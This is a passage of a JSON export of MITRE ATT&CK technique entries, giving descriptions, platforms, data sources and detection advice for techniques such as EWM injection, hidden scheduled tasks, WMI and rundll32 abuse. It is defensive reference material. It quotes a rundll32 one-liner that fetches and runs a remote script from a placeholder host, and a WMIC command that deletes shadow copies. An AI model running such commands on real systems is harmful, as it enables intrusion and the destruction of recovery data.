{
  "techniques": {
    "T1055.011": {
      "id": "T1055.011",
      "name": "Extra Window Memory Injection",
      "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.011",
      "stix_id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
      "created": "2020-01-14T17:18:32.126000+00:00",
      "modified": "2025-04-25T14:45:37.275000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Elastic Process Injection July 2017)"
    },
    "T1053.005": {
      "id": "T1053.005",
      "name": "Scheduled Task",
      "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1053.005",
      "stix_id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
      "created": "2019-11-27T14:58:00.429000+00:00",
      "modified": "2025-04-15T19:58:01.010000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Creation",
        "File: File Modification",
        "File: File Creation",
        "Process: Process Creation",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Flow",
        "Scheduled Job: Scheduled Job Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data."
    },
    "T1205.002": {
      "id": "T1205.002",
      "name": "Socket Filters",
      "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1205.002",
      "stix_id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
      "created": "2022-09-30T21:18:41.930000+00:00",
      "modified": "2025-04-15T23:09:39.651000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.(Citation: crowdstrike bpf socket filters)"
    },
    "T1560.001": {
      "id": "T1560.001",
      "name": "Archive via Utility",
      "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1560.001",
      "stix_id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
      "created": "2020-02-20T21:01:25.428000+00:00",
      "modified": "2025-04-15T21:51:23.078000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)"
    },
    "T1021.005": {
      "id": "T1021.005",
      "name": "VNC",
      "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021.005",
      "stix_id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b",
      "created": "2020-02-11T18:28:44.950000+00:00",
      "modified": "2025-04-15T19:58:01.548000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Logon Session: Logon Session Creation",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use of VNC may be legitimate depending on the environment and how it\u2019s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using VNC.\n\nOn macOS systems <code>log show --predicate 'process = \"screensharingd\" and eventMessage contains \"Authentication:\"'</code> can be used to review incoming VNC connection attempts for suspicious activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMonitor for use of built-in debugging environment variables (such as those containing credentials or other sensitive information) as well as test/default users on VNC servers, as these can leave openings for adversaries to abuse.(Citation: Gnome Remote Desktop grd-settings)(Citation: Gnome Remote Desktop gschema)"
    },
    "T1047": {
      "id": "T1047",
      "name": "Windows Management Instrumentation",
      "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1047",
      "stix_id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
      "created": "2017-05-31T21:30:44.329000+00:00",
      "modified": "2025-04-15T19:58:01.648000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation",
        "WMI: WMI Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)"
    },
    "T1113": {
      "id": "T1113",
      "name": "Screen Capture",
      "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1113",
      "stix_id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
      "created": "2017-05-31T21:31:25.060000+00:00",
      "modified": "2025-04-15T23:03:14.254000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment."
    },
    "T1027.011": {
      "id": "T1027.011",
      "name": "Fileless Storage",
      "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock` may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation: Aquasec Muhstik Malware 2024)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.011",
      "stix_id": "attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939",
      "created": "2023-03-23T19:55:25.546000+00:00",
      "modified": "2025-04-15T22:35:48.121000+00:00",
      "platforms": [
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Creation",
        "WMI: WMI Creation",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1037": {
      "id": "T1037",
      "name": "Boot or Logon Initialization Scripts",
      "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1037",
      "stix_id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
      "created": "2017-05-31T21:30:38.910000+00:00",
      "modified": "2025-04-15T19:58:02.121000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Windows Registry: Windows Registry Key Creation",
        "Command: Command Execution",
        "File: File Creation",
        "Process: Process Creation",
        "Active Directory: Active Directory Object Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon."
    },
    "T1557": {
      "id": "T1557",
      "name": "Adversary-in-the-Middle",
      "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1557",
      "stix_id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
      "created": "2020-02-11T19:07:12.114000+00:00",
      "modified": "2025-04-15T19:58:02.209000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content",
        "Windows Registry: Windows Registry Key Modification",
        "Network Traffic: Network Traffic Flow",
        "Service: Service Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor network traffic for anomalies associated with known AiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow."
    },
    "T1033": {
      "id": "T1033",
      "name": "System Owner/User Discovery",
      "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1033",
      "stix_id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
      "created": "2017-05-31T21:30:35.733000+00:00",
      "modified": "2025-04-15T19:58:02.301000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Access",
        "Process: OS API Execution",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Content",
        "Process: Process Creation",
        "Network Traffic: Network Traffic Flow",
        "Windows Registry: Windows Registry Key Access",
        "File: File Access",
        "Process: Process Access"
      ],
      "defense_bypassed": [],
      "detection": "`System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations."
    },
    "T1583": {
      "id": "T1583",
      "name": "Acquire Infrastructure",
      "description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583",
      "stix_id": "attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2",
      "created": "2020-09-30T16:37:40.271000+00:00",
      "modified": "2025-04-15T21:44:09.753000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Metadata",
        "Internet Scan: Response Content",
        "Domain Name: Active DNS",
        "Domain Name: Passive DNS",
        "Domain Name: Domain Registration"
      ],
      "defense_bypassed": [],
      "detection": "Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. \n\nOnce adversaries have provisioned infrastructure (ex: a server for use in command and control), internet scans may help proactively discover adversary acquired infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1218.011": {
      "id": "T1218.011",
      "name": "Rundll32",
      "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.011",
      "stix_id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
      "created": "2020-01-23T18:03:46.248000+00:00",
      "modified": "2025-04-15T19:58:02.470000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Metadata",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls."
    },
    "T1613": {
      "id": "T1613",
      "name": "Container and Resource Discovery",
      "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1613",
      "stix_id": "attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336",
      "created": "2021-03-31T14:26:00.848000+00:00",
      "modified": "2025-04-15T22:10:13.179000+00:00",
      "platforms": [
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Pod: Pod Enumeration",
        "Container: Container Enumeration"
      ],
      "defense_bypassed": [],
